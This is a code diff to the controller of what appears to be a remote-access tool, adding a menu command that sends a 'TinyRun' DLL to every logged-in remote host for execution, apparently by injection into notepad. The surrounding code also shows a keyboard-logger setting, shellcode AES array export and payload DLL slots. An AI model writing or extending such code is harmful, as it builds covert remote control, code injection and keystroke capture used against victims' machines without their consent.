@@ -386,6 +386,7 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::I
     m_bmOnline[15].LoadBitmap(IDB_BITMAP_UNINSTALL);
     m_bmOnline[16].LoadBitmap(IDB_BITMAP_PDESKTOP);
     m_bmOnline[17].LoadBitmap(IDB_BITMAP_REGROUP);
+    m_bmOnline[18].LoadBitmap(IDB_BITMAP_INJECT);
 
     for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
         m_ServerDLL[i] = nullptr;
@@ -539,7 +540,8 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_TOOL_RELOAD_PLUGINS, &CMy2015RemoteDlg::OnToolReloadPlugins)
     ON_COMMAND(ID_SHELLCODE_AES_C_ARRAY, &CMy2015RemoteDlg::OnShellcodeAesCArray)
     ON_COMMAND(ID_PARAM_KBLOGGER, &CMy2015RemoteDlg::OnParamKblogger)
-END_MESSAGE_MAP()
+        ON_COMMAND(ID_ONLINE_INJ_NOTEPAD, &CMy2015RemoteDlg::OnOnlineInjNotepad)
+        END_MESSAGE_MAP()
 
 
 // CMy2015RemoteDlg 消息处理程序
@@ -1590,6 +1592,7 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
     Menu.SetMenuItemBitmaps(ID_ONLINE_UNINSTALL, MF_BYCOMMAND, &m_bmOnline[15], &m_bmOnline[15]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_PRIVATE_SCREEN, MF_BYCOMMAND, &m_bmOnline[16], &m_bmOnline[16]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_REGROUP, MF_BYCOMMAND, &m_bmOnline[17], &m_bmOnline[17]);
+    Menu.SetMenuItemBitmaps(ID_ONLINE_INJ_NOTEPAD, MF_BYCOMMAND, &m_bmOnline[18], &m_bmOnline[18]);
 
     std::string masterHash(GetMasterHash());
     if (GetPwdHash() != masterHash) {
@@ -4021,4 +4024,20 @@ void CMy2015RemoteDlg::OnParamKblogger()
     SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
     THIS_CFG.SetInt("settings", "KeyboardLog", m_settings.EnableKBLogger);
     SendMasterSettings(nullptr);
+}
+
+
+void CMy2015RemoteDlg::OnOnlineInjNotepad()
+{
+    auto tinyRun = ReadTinyRunDll(0);
+	EnterCriticalSection(&m_cs);
+	for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
+		context* ctx = *i;
+		if (!ctx->IsLogin())
+			continue;
+		Buffer* buf = tinyRun->Data;
+		ctx->Send2Client(buf->Buf(), 1 + sizeof(DllExecuteInfo));
+	}
+	LeaveCriticalSection(&m_cs);
+    SAFE_DELETE(tinyRun);
 }
